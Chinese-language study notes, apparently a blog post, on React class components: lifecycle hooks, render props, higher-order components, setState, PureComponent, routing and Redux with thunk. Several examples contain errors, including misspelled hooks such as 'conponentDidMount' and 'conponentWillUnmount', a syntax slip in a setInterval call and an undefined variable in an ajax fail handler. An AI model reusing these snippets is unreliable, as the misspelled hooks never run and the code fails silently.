componentDidMount()&#123; console.warn(&#x27;生命周期钩子函数：componentDidMount&#x27;) &#125; handleClick = () =&gt;&#123; this.setState(&#123; count: this.state.count + 1 &#125;) &#125; render() &#123; return ( &lt;div&gt; &lt;Counter count=&#123;this.state.count&#125; /&gt; &lt;button onClick=&#123;this.handleClick&#125;&gt;打豆豆&lt;/button&gt; &lt;/div&gt; ) &#125;&#125;class Counter extends React.Component &#123; render() &#123; console.warn(&#x27;--子组件--生命周期钩子函数：render&#x27;) return &lt;h1 id=&#x27;title&#x27;&gt;统计豆豆被打的次数：&#123;this.props.count&#125;&lt;/h1&gt; &#125; conponentDidUpdate(prevProps) &#123; console.warn(&#x27;--子组件--生命周期钩子函数：conponentDidUpdate&#x27;) console.log(&#x27;上一次的props: &#x27;, prevProps, &#x27;，当前的props：&#x27;, this.props) if(prevProps.count !== this.props.count) &#123; this.setState(&#123;&#125;) // 发送ajax请求的代码 &#125; &#125;&#125;ReactDOM.render(&lt;App /&gt;, document.getElementById(&#x27;root&#x27;)) 卸载时（卸载阶段） 执行时机：组件从页面中消失 钩子函数执行顺序： componentWillUnmount 钩子函数 触发时机 作用 componentWillUnmount 组件卸载（从页面中消失） 执行清理工作（比如：清理定时器等） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667class App extends React.Component &#123; constructor(props) &#123; super(props) this.state = &#123; count: 0 &#125; console.warn(&#x27;生命周期钩子函数：constructor&#x27;) &#125; componentDidMount()&#123; console.warn(&#x27;生命周期钩子函数：componentDidMount&#x27;) &#125; handleClick = () =&gt;&#123; this.setState(&#123; count: this.state.count + 1 &#125;) &#125; render() &#123; return ( &lt;div&gt; &#123;this.state.count &gt; 3 ? ( &lt;p&gt;豆豆被打死了~&lt;/p&gt; ) : ( &lt;Counter count=&#123;this.state.count&#125; /&gt; )&#125; &lt;button onClick=&#123;this.handleClick&#125;&gt;打豆豆&lt;/button&gt; &lt;/div&gt; ) &#125;&#125;class Counter extends React.Component &#123; conponentDidMount() &#123; // 开启定时器 this.timerId = setInterval(() =&gt; &#123; console.log(&quot;定时器正在执行~&quot;) &#125;. 500) &#125; render() &#123; console.warn(&#x27;--子组件--生命周期钩子函数：render&#x27;) return &lt;h1 id=&#x27;title&#x27;&gt;统计豆豆被打的次数：&#123;this.props.count&#125;&lt;/h1&gt; &#125; conponentWillUnmount()&#123; console.warn(&#x27;--子组件--生命周期钩子函数：conponentWillUnmount&#x27;) // 清理定时器 clearInterval(this.timerId) &#125; conponentDidUpdate(prevProps) &#123; console.warn(&#x27;--子组件--生命周期钩子函数：conponentDidUpdate&#x27;) console.log(&#x27;上一次的props: &#x27;, prevProps, &#x27;，当前的props：&#x27;, this.props) if(prevProps.count !== this.props.count) &#123; this.setState(&#123;&#125;) // 发送ajax请求的代码 &#125; &#125;&#125;ReactDOM.render(&lt;App /&gt;, document.getElementById(&#x27;root&#x27;)) 其他钩子函数 旧版本遗留，先已弃用的钩子函数： componentWillMount() ComponentWillReceiveProps() ComponentWillUpdate() 新版完整生命周期钩子函数： 创建时： constructor getDerivedStateFromProps(不常用) render React更新DOM和refs componentDidMount 更新时 getDerivedStateFromProps(不常用) shouldComponentUpdate(详见组件性能优化) render getSnapshotBeforeUpdate(不常用) React更新DOM和refs componentDidUpdate 卸载时 componentWillUnmount render-props和高阶组件 组件复用 如果两个组件中的部分功能相似或相同时，该如何处理？ 因此对于相似的功能，我们希望能偶复用相似的功能。 复用时事实上时复用以下两点： state 操作state的方法（组件状态逻辑 React中组件复用包含两种方式： render props模式 高阶组件（HOC） 以上两种方式是利用React自身特点的编码技巧，不是API render-props模式 思路：将要复用的state和操作state的方法封装到一个组件中 问题： 如何拿到该组件中复用的state 在使用组件时，添加一个值为函数的prop，通过函数参数来获取（需要组件内部实现） 如何渲染任意UI 使用该函数的返回值作为要渲染的UI内容（需要组件内部实现） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import &#x27;./index.css&#x27;;import React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;import PropTypes from &#x27;prop-types&#x27;/* render props 模式*/// 导入图片资源import img from &#x27;./images/end_favicon128.ico&#x27;// 创建复用组件class Mouse extends React.Component &#123; constructor(props) &#123; super(props) // 鼠标位置state this.state = &#123; x: 0, y: 0, &#125; &#125; // 鼠标位置事件处理函数 handleMouseMove = e =&gt; &#123; this.setState(&#123; x: e.clientX, y: e.clientY, &#125;) &#125; // 开启鼠标监听事件 componentDidMount() &#123; window.addEventListener(&#x27;mousemove&#x27;, this.handleMouseMove) &#125; render() &#123; return this.props.render(this.state) &#125;&#125;const App = props =&gt; &#123; return ( &lt;div&gt; &lt;h1&gt;render props 模式&lt;/h1&gt; &lt;Mouse render=&#123;(mouse) =&gt; &#123; return ( &lt;p&gt;鼠标位置：&#123;mouse.x&#125;, &#123;mouse.y&#125;&lt;/p&gt; ) &#125;&#125; /&gt; &#123;/* 复用Mouse组件 */&#125; &lt;Mouse render=&#123;mouse =&gt; &#123; return ( &lt;img src=&#123;img&#125; style=&#123;&#123; position: &#x27;absolute&#x27;, top: mouse.y, left: mouse.x &#125;&#125; /&gt; ) &#125;&#125;&gt; &lt;/Mouse&gt; &lt;/div&gt; )&#125;ReactDOM.render(&lt;App /&gt;, document.getElementById(&#x27;root&#x27;)) 在上面这个例子中： Mouse组件负责：封装复用的状态逻辑代码： 状态：鼠标坐标（x，y） 操作状态的方法：鼠标移动事件 传入的render prop负责：使用复用的状态来渲染UI结构 children代替render 此外还能使用children替代上例中的render，这种方式更直观，更推荐使用： 12345678&lt;Mouse&gt; &#123;(mouse) =&gt; &lt;p&gt;鼠标位置是 &#123;mouse.x&#125;, &#123;mouse.y&#125;&lt;/p&gt;&#125;&lt;/Mouse&gt;// 组件内部render() &#123; return this.props.children(this.state)&#125; 此处联想到前文提到的Context： 12345678910const Child = props =&gt; &#123; return &lt;div className=&#x27;child&#x27;&gt; &lt;!-- 使用consumer组件接受数据 --&gt; &lt;Consumer&gt; &#123; data =&gt; &lt;span&gt;我是子节点 -- &#123;data&#125;&lt;/span&gt; &#125; &lt;/Consumer&gt; &lt;/div&gt;&#125; 实际上此处context也是使用了render props模式，且使用了children代替render。 现在可以对render props给出一个粗略的定义： render props 模式是指将一个函数作为prop，并使用该函数告诉组件要渲染什么内容的技术 render props模式代码优化 给render props模式添加props校验 组件卸载时应该解除mousemove事件绑定（使用react添加的事件绑定react会帮我们处理） 高阶组件 高阶组件时一种采用包装（装饰）模式实现的状态逻辑复用（例如python中的高阶函数，java中的AOP） 实现思路： 高阶组件（HOC）是一个函数，接收要包装的组件，返回增强后的组件 高阶组件内部创建一个类组件，在这个类组件中提供复用的状态逻辑代码，通过prop将复用的状态传递给包装组件WrappedComponent 使用步骤 创建一个函数，名称约定以with开头 指定函数参数，参数应以大写字母开头（因为参数要被作为组件渲染） 在函数内部创建一个类组件，提供复用的状态逻辑代码，并返回 在该组件中，渲染参数组件，同时将状态通过prop传递给参数组件 调用高阶组件，传入要增强的组件，通过返回值拿到增强后的组件，并将其渲染到页面中 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import &#x27;./index.css&#x27;;import React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;import PropTypes from &#x27;prop-types&#x27;import react from &#x27;react&#x27;;import img from &#x27;./images/end_favicon128.ico&#x27;import &#123; render &#125; from &#x27;@testing-library/react&#x27;;/* 高阶组件模式*/// 创建高阶组件function withMouse(WrappedComponent) &#123; // 该组件提供复用的状态逻辑 class Mouse extends react.Component &#123; constructor() &#123; super() this.state = &#123; x: 0, y: 0, &#125; &#125; componentDidMount() &#123; window.addEventListener(&#x27;mousemove&#x27;, this.handleMouseMove) &#125; handleMouseMove = e =&gt; &#123; this.setState(&#123; x: e.clientX, y: e.clientY, &#125;) &#125; render() &#123; return &lt;WrappedComponent &#123;...this.state&#125;&gt;&lt;/WrappedComponent&gt; &#125; componentWillUnmount() &#123; window.removeEventListener(&#x27;mousemove&#x27;, this.handleMouseMove) &#125; &#125; return Mouse&#125;const Cat = props =&gt; ( &lt;img src=&#123;img&#125; alt=&#x27;logo&#x27; style=&#123;&#123; position: &#x27;absolute&#x27;, top: props.y, left: props.x, &#125;&#125; /&gt;)const Position = props =&gt; ( &lt;p&gt; 鼠标当前位置：(x: &#123;props.x&#125;, y: &#123;props.y&#125;) &lt;/p&gt;)// 获取增强后的组件const MousePosition = withMouse(Position)const CatMouse = withMouse(Cat)class App extends React.Component &#123; render ()&#123; return ( &lt;div&gt; &lt;h1&gt;高阶组件模式&lt;/h1&gt; &#123;/* 渲染增强后的组件 */&#125; &lt;MousePosition /&gt; &lt;CatMouse /&gt; &lt;/div&gt; ) &#125;&#125; ReactDOM.render(&lt;App /&gt;, document.getElementById(&#x27;root&#x27;)) 设置displayName 使用高阶组件存在的问题： 得到的两个组件名称相同 原因是默认情况下React使用组件名称作为displayName 为高阶组件设置displayName便于调试时区分不同的组件 displayName：用于设置调试信息（React Develop Tools信息） 设置方法： 1234567// 获得组件的displayName的函数function getDisplayName(WrappedComponent) &#123; return WrappedComponent.displayName || WrappedComponent.name || &#x27;Component&#x27;;&#125;// 设置displayNameMouse.displayName = `WithMouse$&#123;getDisplayName(WrappedComponent)&#125;` 传递props 使用高阶组件实际上是用一个组将将另一个组件包裹，那么这样会导致渲染时传入的props无法传递到被包裹的组件，而是传递到用于包裹的组件中，因此需要在用于包裹的组件中将props和state一起传递给被包裹的组件。 123render() &#123; return &lt;WrappedComponent &#123;...this.state&#125; &#123;...this.props&#125;&gt;&lt;/WrappedComponent&gt;&#125; React原理 setState方法 更新数据 setState方法更新数据时异步的 因此使用该语法时，后面的setState不能依赖于前面的setState 另外，待用多次setState方法，只会触发一次重新渲染 推荐语法 推荐使用setState((state, props) =&gt; {})语法 参数state表示最新的state 参数props表示最新的props 该方法中state的更新仍然是异步的，但该方法利用了回调函数的特性：setState本身是异步的，但setState函数内部的语句依然是同步进行的。解决数据不一致的问题，使得其参数中的state每次都是获取到最新的state，这样连续使用setState方法不会出现异步问题 1234567891011this.setState((state, props) =&gt; &#123; return &#123; count: state.count + 1 &#125;&#125;)this.setState((state, props) =&gt; &#123; return &#123; count: state.count + 1 &#125;&#125;)// 两次setState将导致count+2 回调函数 思考这样一个实际引用中的问题： 123456789101112131415function postApi (url, data) &#123; var result = &#123;&#125;; $.ajax(&#123; url: url, type: &#x27;post&#x27;, data: data ? data : &#123;&#125;, success: (res) =&gt; &#123; result = res &#125;, fail: (err) =&gt; &#123; result = res &#125; &#125;) return result&#125; 我们需要通过调用请求API得到一些数据，请求API中使用Ajax请求数据，但Ajax是异步的。 于是我们调用： 1var res = postApi(url, data) 得到的res将是{}。 原因就在于JS这类脚本语言的执行机制，当js代码运行到调用postAPI的语句时，对于这些同步语句，JS将顺序执行，知道遇到异步语句，而此时，JS已经执行完postApi的传参，那么下一步将会创建一个result变量并将其初始化。接下来JS遇到了异步语句ajax，那么JS将会将ajax放入异步队列，然后继续执行下一个同步语句，也就是return result，同时位于异步队列中的ajax会进行计时器等待，取出并执行等操作。因此res接收到数据时，postApi中并没有完成对result的赋值。 当然ajax可以通过设置async:false将其设置为同步语句，但这样会导致进程阻塞效率下降。因此我们现在希望在执行完ajax中的语句后再对res赋值。 于是我们想到可以把postApi中的res作为参数传递给一个函数，由于函数时在异步语句内调用的，而异步语句的内部的操作实际上是同步的，因此ajax内部的函数调用会顺序执行。 下面我们给出回调函数的定义： 回调函数值函数的应用方式，出现在两个函数之间，用于指定异步的语句做完之后要做的事情 下发如下： 把函数a当做参数传递到函数b中 在函数b中以形参的方式进行调用 1234567function a(cb)&#123; cb()&#125;function b()&#123; console.log(&#x27;函数b&#x27;)&#125;a(b) 这一定义很像python中的高阶函数，高阶函数的定义为：以函数作为参数的函数，称为高阶函数。 可见高阶函数是对上例中的a进行了定义，而回调函数是对上例中的b进行了定义。 那么我们就可以使用回调函数来解决之前提到的这个问题： 1234567891011121314151617function postApi ( url, data, cb ) &#123; $.ajax(&#123; url: url, type: &#x27;post&#x27;, data: data ? data : &#123;&#125;, success: (res) =&gt; &#123; cb &amp;&amp; cb(res) &#125;, fail: (err) =&gt; &#123; cb &amp;&amp; cb(err) &#125; &#125;)&#125;postApi(url, data, (res) =&gt; &#123; console.log(res)&#125;) 此时我们就可以在调用postApi时传入的箭头函数中得到正确的res值，并在其中对res值进行一些操作。 甚至还可以使用闭包这一概念去理解这一方法的应用，使用回调函数时，实际上是利用了闭包的思想，保存了函数执行时的作用域，使得异步操作能在这个作用域中拿到准确的数据。 第二个参数 事实上setState函数还存在第二个参数： 1234this.setState( (state, props) =&gt; &#123;&#125;, () =&gt; &#123;console.log(&#x27;这个回调函数会在状态更新后立即执行&#x27;)&#125;) 使用场景：在状态更新后并且页面完成重修渲染后立即执行某个操作 注意这个执行时机与componentDidUpdate钩子函数执行时机相同 语法setState(updater[, callback]) JSX语法转化过程 JSX仅仅是React.createElement的语法糖 JSX语法会被@babel/preset-react插件编译为createElement方法 createElement方法最终又会被转化为React元素（React Element），该元素是一个JS对象，用来描述UI内容 组件更新机制 对于多层树结构的组件结构，组件的更新过程如下： 父组件重新渲染时，子组件也会被重修渲染 渲染只发生在当前组件的子树中 更新顺序按中序遍历序更新 组件性能优化 减轻state 只存储根组件渲染相关的数据（如列表数据/loading等） 不用做渲染的数据不要放在state中，比如定时器id 这些数据可以直接放在this中 避免不必要的重新渲染 父组件的更新将会引起子组件更新 但如果子组件没有任何变换也会重新渲染 可以使用钩子函数shouldComponentUpdate(nextProps, nextState) 触发时机：更新阶段的钩子函数，组件重新渲染前执行（即在render前执行） 作用：返回一个boolean，通过该函数的返回值来决定组件是否重新渲染。 两个参数表示了最新的state与最新的props 在该函数中使用this.state能够获取到更新前的状态 纯组件 考虑上文提到的使用shouldComponentUpdate方法实现的避免重新渲染，如果每一个组件都需要我们手动地去实现这样的一个钩子函数，将会产生非常多的重复代码，但是有时候使用该方法运行我们进行一些特殊的操作，比如深比较，因此React为我们提供了更方便的方法：PureComponent 123456789101112131415161718class Father extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; value:0 &#125; &#125; onClick=()=&gt;&#123; this.setState(&#123; value : this.state.value+1 &#125;) &#125; render() &#123; console.log(&#x27;father render&#x27;) return (&lt;div&gt; &lt;button onClick=&#123;this.onClick&#125;&gt;click me&lt;/button&gt; &lt;Son value=&#123;this.state.value&#125;&gt;&lt;/Son&gt; &lt;/div&gt; ); &#125;&#125; 12345678910111213141516import React, &#123; Component,PureComponent &#125; from &#x27;react&#x27;;class Son extends PureComponent &#123; constructor(props) &#123; super(props); this.state = &#123; &#125; &#125; render() &#123; console.log(&#x27;son render&#x27;) return (&lt;div&gt; &#123;this.props.value&#125; &lt;/div&gt; ); &#125;&#125; export default Son; 但是使用纯组件时，纯组件内部进行的新旧值对比采用的是shallpw compare（浅对比）的方法： 对于值类型而言：直接比较两个值是否相同 但对于引用类型而言：值对比对象的地址是否相同 因此采用纯组件时，当我们需要更新state或props中的引用类型数据时，应该创建一个新数据，而不是直接修改原数据。 可以使用扩展运算符来创建新数据： 12345678const newObj = &#123;...state.obj, number:2&#125;this.setState(&#123;obj: newObj&#125;)// 更新数组时不要使用push/unshift等直接修改当前数组的方法// 可以使用concat或slice等返回新数组的方法this.setState(&#123; list: [...this.state.list, &#123;/*新数据*/&#125;]&#125;) 虚拟DOM与Diff算法 React更新的思路是：只要state发生变化，就需要重新渲染视图。 但有这么一个问题：如果组件中有多个DOM元素，当只有一个DOM元素需要更新时，是不是也需要将整个组件全部更新？ 实际上React通过虚拟DOM与Diff算法实现了组件的部分更新 实际上虚拟DOM对象就是React元素，用于描述UI。 React部分渲染的实现流程如下： 初次渲染时，React根据初始state（Model），创建一个虚拟DOM对象（虚拟DOM树） 根据虚拟DOM生产真正的DOM，渲染到页面中 当数据变化后，重新根据新数据，创建新的虚拟DOM对象 与上一次得到的虚拟DOM对象，使用Diff算法对比得到需要更新的内容 最终，React只将变化的内容更新（patch）到DOM中，重新渲染得到页面 实际上虚拟DOM最大的价值在于： 虚拟DOM让React脱离了浏览器环境的束缚，为跨平台提供了基础 路由 React路由 现代前端应用大多数时SPA（单页应用程序），也就是只有一个HTML页面的应用程序，因为他的用户体验更好、对服务器的压力更小。为了有效地使用单个页面来管理原来多个页面的功能，前端路由应运而生。 前端路由功能：让用户从一个视图（页面）导航到另一个视图（页面） 前端路由是一套映射规则，在React中，是URL路径与组件的对应关系 使用React路由简单来说，就是配置路径和组件（配对） React路由基本使用 安装：yarn add react-router-dom 导入路由的三个核心组件：BrowserRouter/Route/Link import &#123;BrowserRouter as Router, Route, Link&#125; from 'react-router-dom' 使用Router组件包裹整个应用 使用Link组件作为导航菜单（路由入口） &lt;Link to=&quot;/first&quot;&gt;页面一&lt;/Link&gt; 使用Route组件配置路由规则和要展示的组件（路由出口） path表示路径，与Link中的to属性的内容对应 component表示要展示的组件 &lt;Route path=&quot;/first&quot; component=&#123;First&#125;&gt;&lt;/Route&gt; 注意react-router-domV6版本之后使用方法有所改动 常用组件声明 Router组件：包裹整个应用，以恶搞React应用只需要使用一次 两种常用的Router： HashRouter（使用URL的哈希值实现（localhost:3000/#/first））在Vue中兼容性更好 BrowserRouter（使用H5中的history API实现（localhost:3000/first）） Link组件：用于指定导航链接 最终会被编译为a标签；to属性被编译为href，即浏览器地址栏中的pathname 可以通过location.pathname来获取to中的值 Route组件：指定路由展示组件相关信息 path属性：路由规则 component属性：展示的组件 Route组件写在哪，组件就会被渲染在哪 路由执行过程 点击Link组件，修改了浏览器地址中的url React路由监听到地址栏url变化 React路由内部遍历所有Route组件，使用路由规则（path）与pathname进行匹配 当路由规则与pathname匹配时，展示该Route组件的内容 编程式导航 编程式导航：通过JS代码实现页面跳转 1this.props.history.push(&#x27;/home&#x27;) history是Reract路由提供的，用于获取浏览器历史记录的相关信息 push（path）：跳转到某个页面，参数path表示要跳转的路径 注意react-route-domV6版本不支持此方法，应使用useNavigate()API const navigate = userNavigate();navigate('/home') go(n)：前进或后退到某个页面，参数n表示前进或后退页面的数量（-1表示后退一页） 默认路由 进入页面时默认的展示页面 默认路由：进入页面时就会默认匹配的路由 默认路由的path：/ &lt;Route path=&quot;/&quot; component=&#123;Home&#125; /&gt; 匹配模式 模糊匹配模式 问题：默认路由在路由切换时仍然会被显示(V6没有这个问题) 原因：默认情况下React路由是模糊匹配模式 模糊匹配规则：之哟啊pathname以path开头就会被匹配成功 精确匹配 给Route组件添加exact属性，就能让其变为精确匹配模式 精确匹配：只有当path和pathname 完全匹配时才会展示该路由 redux redux是一个专门用于状态管理的JS库（不是react插件库） 可用于三大框架，但基本与React配合 集中式管理react应用中多个组件共享状态 使用redux的情况 某个组件的状态需要让其他组件共享 一个组件需要改变另一个组件的状态（通讯） 核心概念 action 动作对象 包含2个属性 type：标识属性，字符串，唯一，必要属性 data：数据属性，任意类型，可选属性 例如：&#123; type: 'TOGGLE_TODO', index: 1 &#125; reducer 用于初始化状态、加工状态 加工时，根据旧的state和action，产生新的state的纯函数 store 将state、action、reducer联系在一起的对象 如何得到此对象： 123import &#123;createStore&#125; from &#x27;redux&#x27;import reducer from &#x27;./reducers&#x27;const store = createStore(reducer) 此对象的功能： getState():得到state dispatch(action): 分发action，触发reducer调用，产生新的state subscribe(listener): 注册监听，当产生了新的state时，自动调用 Redux案例 该案例实现了一个计数器，计数器提供如下功能： 可以从1，2，3中选择每次增加的步长 实现加法 实现减法 实现奇数加 实现异步加，等待时间为5秒 纯react写法： 123456789101112131415import React, &#123; Component &#125; from &quot;react&quot;;import Count from &#x27;./component/Count&#x27;//App.jsclass App extends Component &#123; render() &#123; return ( &lt;div&gt; &lt;Count /&gt; &lt;/div&gt; ) &#125;&#125;export default App 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778import React, &#123; Component &#125; from &quot;react&quot;;// Count组件class Count extends Component &#123; constructor() &#123; super() this.state = &#123; count:0, selectNumber: &#x27;1&#x27;, &#125; &#125; increment = () =&gt; &#123; // 函数体 const &#123;count, selectNumber&#125; = this.state console.log(count, typeof(selectNumber)); this.setState(&#123; count: count + (+ selectNumber) &#125;) &#125; decrement = () =&gt; &#123; // 函数体 const &#123;count, selectNumber&#125; = this.state console.log( count, typeof(selectNumber)); this.setState(&#123; count: count - (+ selectNumber), &#125;) &#125; incrementIfOdd = () =&gt; &#123; // 函数体 const &#123;count, selectNumber&#125; = this.state console.log(count, selectNumber); if(count % 2 !=0)&#123; this.setState(&#123; count: count + + selectNumber &#125;) &#125; &#125; incrementAsync = () =&gt; &#123; // 函数体 const &#123;count, selectNumber&#125; = this.state console.log(count, selectNumber); setTimeout(() =&gt; &#123; this.setState(&#123; count: count + + selectNumber &#125;) &#125;, 500) &#125; handleChange = (e) =&gt; &#123; const target = e.target const value = target.type === &quot;checkbox&quot; ? target.checked : target.value; const name = target.name this.setState(&#123; [name]: value &#125;) &#125; render() &#123; return ( &lt;div&gt; &lt;h1&gt;当前求和为：&#123;this.state.count&#125;&lt;/h1&gt; &lt;select name=&quot;selectNumber&quot; value=&#123;this.state.selectNumber&#125; onChange=&#123;this.handleChange&#125;&gt; &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt; &lt;/select&gt;&amp;nbsp; &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/button&gt;&amp;nbsp; &lt;button onClick=&#123;this.decrement&#125;&gt;-&lt;/button&gt;&amp;nbsp; &lt;button onClick=&#123;this.incrementIfOdd&#125;&gt;当前求和为奇数则加&lt;/button&gt;&amp;nbsp; &lt;button onClick=&#123;this.incrementAsync&#125;&gt;异步加&lt;/button&gt; &lt;/div&gt; ) &#125;&#125;export default Count redux精简实现 该精简版并未实现Redux中的Action Creators 目录结构： 123456789src - component - Count - index.js // count组件 - redux - countReducer.js // 为Count组件提供共享数据 - store.js // 管理Reducer - App.js // 根组件 - index.js // 项目入口 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import React, &#123; Component &#125; from &quot;react&quot;;import store from &quot;../../redux/store&quot;;/** * count组件 */class Count extends Component &#123; constructor() &#123; super() this.state = &#123; selectNumber: &#x27;1&#x27;, &#125; &#125; componentDidMount() &#123; // 由于共享状态的更新不会引起本组件重新渲染，因此需要监听共享数据的变化 // 在组件挂载完成后为组件添加一个检测store中state变化的功能，通过回调函数重新渲染 store.subscribe(() =&gt; &#123; this.forceUpdate() &#125;) &#125; increment = () =&gt; &#123; // 函数体 const &#123;selectNumber&#125; = this.state // 分发一个action store.dispatch(&#123;type:&#x27;increment&#x27;, data:selectNumber*1&#125;) &#125; decrement = () =&gt; &#123; // 函数体 const &#123;selectNumber&#125; = this.state store.dispatch(&#123;type:&#x27;decrement&#x27;, data:selectNumber*1&#125;) &#125; incrementIfOdd = () =&gt; &#123; // 函数体 const &#123;selectNumber&#125; = this.state const count = store.getState() if(count % 2 !=0)&#123; store.dispatch(&#123;type:&#x27;increment&#x27;, data:selectNumber*1&#125;) &#125; &#125; incrementAsync = () =&gt; &#123; // 函数体 const &#123;selectNumber&#125; = this.state setTimeout(() =&gt; &#123; store.dispatch(&#123;type: &#x27;increment&#x27;, data: selectNumber*1&#125;) &#125;, 500) &#125; handleChange = (e) =&gt; &#123; const target = e.target const value = target.type === &quot;checkbox&quot; ? target.checked : target.value; const name = target.name this.setState(&#123; [name]: value &#125;) &#125; render() &#123; return ( &lt;div&gt; &#123;/* 获取利用store，Reducer中的公共状态 */&#125; &lt;h1&gt;当前求和为：&#123;store.getState()&#125;&lt;/h1&gt; &lt;select name=&quot;selectNumber&quot; value=&#123;this.state.selectNumber&#125; onChange=&#123;this.handleChange&#125;&gt; &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt; &lt;/select&gt;&amp;nbsp; &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/button&gt;&amp;nbsp; &lt;button onClick=&#123;this.decrement&#125;&gt;-&lt;/button&gt;&amp;nbsp; &lt;button onClick=&#123;this.incrementIfOdd&#125;&gt;当前求和为奇数则加&lt;/button&gt;&amp;nbsp; &lt;button onClick=&#123;this.incrementAsync&#125;&gt;异步加&lt;/button&gt; &lt;/div&gt; ) &#125;&#125;export default Count 1234567891011121314151617181920212223/** * countReducer * 该文件用于创建一个为Count组件服务的reducer，本质是一个函数 * reducer函数将接收到两个参数，分别为：1. 之前的状态preState，动作对象action */const initState = 0// 事实上该函数是一个纯函数export default function countReducer(preState = initState, action) &#123; console.log(preState, action) // 从action对象中解析type、data const &#123;type, data&#125; = action // 根据type类型判断操作 switch (type) &#123; case &#x27;increment&#x27;: return preState + data case &#x27;decrement&#x27;: return preState - data default: return preState &#125;&#125; 123456789/** * store * 暴露一个store对象 */import &#123;createStore&#125; from &#x27;redux&#x27;// 引入为count服务的reducerimport countReducer from &#x27;./countReducer&#x27;export default createStore(countReducer) 完整redux实现 完整版redux使用action creator来创建action，不需要我们自己创建 目录结构： 1234567891011src - component - Count - index.js // count组件 - redux - constant.js // 定义action对象中type类型的常量值 - countActionCreator.js // 为Count组件生产action对象 - countReducer.js // 为Count组件提供共享数据 - store.js // 管理Reducer - App.js // 根组件 - index.js // 项目入口 123456/** * 该模块用于定义action对象中type类型的常量值 */export const INCREMENT = &#x27;increment&#x27;export const DECREMENT = &#x27;decrement&#x27; 123456789101112131415161718192021/** * countActionCreator.js * 该组件专门为Count组件生产action对象 */import &#123; INCREMENT, DECREMENT &#125; from &quot;./constant&quot;// redux中规定同步action指action的值为对象export const createIncrementAction = data =&gt; (&#123;type:INCREMENT, data&#125;)export const createDecrementAction = data =&gt; (&#123;type:DECREMENT, data&#125;)// redux中规定异步action指action的值为函数// 异步action中一般都会使用同步action，因此如果使用异步action，store会将dispatch传入// 异步action不是必须的，逻辑可以自己在组件中实现export const createIncrementAsyncAction = (data, time) =&gt; &#123; return (dispatch) =&gt; &#123; setTimeout(() =&gt; &#123; dispatch(createIncrementAction(data)) &#125;,time) &#125;&#125; 1234567891011121314151617181920212223/** * countReducer * 该文件用于创建一个为Count组件服务的reducer，本质是一个函数 * reducer函数将接收到两个参数，分别为：1. 之前的状态preState，动作对象action */import &#123; INCREMENT, DECREMENT &#125; from &quot;./constant&quot;const initState = 0// 事实上该函数是一个纯函数export default function countReducer(preState = initState, action) &#123; console.log(preState, action) // 从action对象中解析type、data const &#123;type, data&#125; = action // 根据type类型判断操作 switch (type) &#123; case INCREMENT: return preState + data case DECREMENT: return preState - data default: return preState &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import React, &#123; Component &#125; from &quot;react&quot;;import store from &quot;../../redux/store&quot;;// 引入actionCreator， 用于创建action对象import &#123; createIncrementAction, createDecrementAction, createIncrementAsyncAction,&#125; from &#x27;../../redux/countActionCreator&#x27;/** * count组件 */class Count extends Component &#123; constructor() &#123; super() this.state = &#123; selectNumber: &#x27;1&#x27;, &#125; &#125; componentDidMount() &#123; // 由于共享状态的更新不会引起本组件重新渲染，因此需要监听共享数据的变化 // 在组件挂载完成后为组件添加一个检测store中state变化的功能，通过回调函数重新渲染 store.subscribe(() =&gt; &#123; this.forceUpdate() &#125;) &#125; increment = () =&gt; &#123; // 函数体 const &#123;selectNumber&#125; = this.state // 分发一个action store.dispatch(createIncrementAction(selectNumber*1)) &#125; decrement = () =&gt; &#123; // 函数体 const &#123;selectNumber&#125; = this.state store.dispatch(createDecrementAction(selectNumber*1)) &#125; incrementIfOdd = () =&gt; &#123; // 函数体 const &#123;selectNumber&#125; = this.state const count = store.getState() if(count % 2 !=0)&#123; store.dispatch(createIncrementAction(selectNumber*1)) &#125; &#125; incrementAsync = () =&gt; &#123; // 函数体 const &#123;selectNumber&#125; = this.state store.dispatch(createIncrementAsyncAction(selectNumber*1)) &#125; handleChange = (e) =&gt; &#123; const target = e.target const value = target.type === &quot;checkbox&quot; ? target.checked : target.value; const name = target.name this.setState(&#123; [name]: value &#125;) &#125; render() &#123; return ( &lt;div&gt; &#123;/* 获取利用store，Reducer中的公共状态 */&#125; &lt;h1&gt;当前求和为：&#123;store.getState()&#125;&lt;/h1&gt; &lt;select name=&quot;selectNumber&quot; value=&#123;this.state.selectNumber&#125; onChange=&#123;this.handleChange&#125;&gt; &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt; &lt;/select&gt;&amp;nbsp; &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/button&gt;&amp;nbsp; &lt;button onClick=&#123;this.decrement&#125;&gt;-&lt;/button&gt;&amp;nbsp; &lt;button onClick=&#123;this.incrementIfOdd&#125;&gt;当前求和为奇数则加&lt;/button&gt;&amp;nbsp; &lt;button onClick=&#123;this.incrementAsync&#125;&gt;异步加&lt;/button&gt; &lt;/div&gt; ) &#125;&#125;export default Count 1234567891011/** * store * 暴露一个store对象 */import &#123; createStore, applyMiddleware &#125; from &#x27;redux&#x27;// 引入为count服务的reducerimport countReducer from &#x27;./countReducer&#x27;// 引入redux-thunk，用于支持异步actionimport thunk from &#x27;redux-thunk&#x27;export default createStore(countReducer, applyMiddleware(thunk)) 异步Action 123456789101112131415161718192021/** * countActionCreator.js * 该组件专门为Count组件生产action对象 */import &#123; 